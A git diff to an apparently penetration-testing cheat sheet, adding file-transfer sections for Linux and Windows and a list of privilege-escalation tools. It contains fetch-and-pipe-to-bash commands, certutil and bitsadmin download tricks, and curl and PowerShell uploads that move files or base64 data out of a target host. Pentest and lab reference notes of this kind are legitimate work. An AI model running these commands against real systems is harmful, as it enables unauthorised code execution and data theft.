@@ -33,7 +33,7 @@ sudo nmap -sS -A -Pn --min-rate 10000 -p- $IP
 sudo /opt/nessus/sbin/nessus-service
 ```
 
-## Web server enumeration
+## webServerEnum
 
 ### WAF
 ```shell
@@ -240,3 +240,111 @@ www-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209
 ```bash
 www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
 ```
+
+## fileTransferLinux
+
+### httpDownloadServer
+```bash
+python3 -m http.server
+```
+```bash
+python2.7 -m SimpleHTTPServer
+```
+```bash
+php -S 0.0.0.0:8000
+```
+```bash
+ruby -run -ehttpd . -p8000
+```
+
+### httpUploadServer
+```bash
+python3 -m uploadserver
+```
+
+### filelessExecution
+```bash
+curl http://$IP/$file | bash
+```
+```bash
+wget -qO- https://$IP/pythonScript | python3
+```
+
+### fileDownload
+```bash
+wget http://$IP/$file -O $file
+```
+```bash
+curl http://$IP/$file -o $file
+```
+
+### remoteServerDownload
+```bash
+curl http://$IP/$file -o $file
+```
+
+### local2Remote
+```bash
+scp $file user@remoteHost:/tmp/$file
+```
+
+### remote2Local
+```bash
+scp user@remoteHost:$filePath $filePath2Save
+```
+
+### httpsTranfser
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' # create self-sign cert
+```
+```bash
+mkdir https && cd https # create and move to webroot (must be different dir from the cert)
+```
+```bash
+sudo python3 -m uploadserver 443 --server-certificate /root/server.pem # start webServer using the cert
+```
+```bash
+curl -X POST https://$IP/upload -F 'files=@$file' -F 'files=@$file' --insecure # download from target
+```
+
+## fileTransferWindows
+
+### fileDownload
+```powershell
+wget https://$IP/$file -O /tmp/$file
+```
+```powershell
+curl -o /tmp/$file https://$IP/$file
+```
+```powershell
+Invoke-WebRequest https://$IP/$file -OutFile $file
+```
+```powershell
+bitsadmin /transfer n http://$IP/$file C:\Temp\$file
+```
+```powershell
+certutil.exe -verifyctl -split -f http://$IP/$file
+```
+```powershell
+php -r '$file = file_get_contents("https://$IP/$file"); file_put_contents("$file",$file);'
+```
+
+### remote2Local
+```powershell
+scp user@remoteHost:/tmp/$file C:\Temp\$file
+```
+
+### local2Remote
+```powershell
+scp C:\Temp\$file user@remoteHost:/tmp/$file
+```
+
+### fileUpload
+```powershell
+Invoke-WebRequest -Uri http://$IP -Method POST -Body $b64
+```
+
+## privEscTools
+
+linpeas
+winpeas
